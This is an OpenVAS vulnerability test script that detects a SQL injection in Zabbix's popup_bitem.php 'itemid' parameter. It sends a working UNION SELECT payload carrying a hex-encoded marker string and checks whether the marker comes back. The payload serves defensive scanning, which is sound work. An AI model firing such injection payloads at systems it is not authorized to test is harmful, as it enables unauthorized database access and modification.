###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zabbix_popup_bitem_php_sql_injection.nasl 6022 2017-04-25 12:51:04Z teissa $
#
# ZABBIX popup_bitem.php 'itemid' Parameter SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "ZABBIX is prone to an SQL-injection vulnerability because it fails
to sufficiently sanitize user-supplied data before using it in an
SQL query.

Exploiting this issue could allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database.

ZABBIX versions 2.0.1 and earlier are affected.";

tag_solution = "Updates are available. Please see the references for more details.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103525";
CPE = "cpe:/a:zabbix:zabbix";

if (description)
{
 script_oid(SCRIPT_OID);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_version ("$Revision: 6022 $");

 script_name("ZABBIX popup_bitem.php 'itemid' Parameter SQL Injection Vulnerabilit");

 script_xref(name : "URL" , value : "https://support.zabbix.com/browse/ZBX-5348");

 script_tag(name:"last_modification", value:"$Date: 2017-04-25 14:51:04 +0200 (Tue, 25 Apr 2017) $");
 script_tag(name:"creation_date", value:"2012-07-25 11:34:16 +0100 (Wed, 25 Jul 2012)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("zabbix_detect.nasl","zabbix_web_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
include("global_settings.inc");

if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!get_port_state(port))exit(0);

if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

url = dir + '/popup_bitem.php?itemid=1+union+select+1,2,3,4,5,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,7,8,9,10,11,12,13,14,15,16,17,18,19,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%23&dstfrm=1';

if(http_vuln_check(port:port, url:url,pattern:"OpenVAS-SQL-Injection-Test")) {

  security_message(port:port);
  exit(0);

}  

exit(0);
